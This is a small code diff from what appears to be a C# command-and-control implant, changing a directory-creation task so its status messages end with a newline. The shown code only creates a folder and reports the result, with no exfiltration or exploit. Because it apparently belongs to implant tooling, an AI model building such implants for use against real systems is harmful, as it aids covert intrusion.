@@ -15,8 +15,8 @@ namespace Implant.Tasks.Execute
 
             Directory.CreateDirectory(dirPath);
 
-            if (Directory.Exists(dirPath)) { return $"[*] {dirPath} created"; }
-            return $"[-] Failed to create {dirPath}";
+            if (Directory.Exists(dirPath)) { return $"[*] {dirPath} created\n"; }
+            return $"[-] Failed to create {dirPath}\n";
         }
     }
 }
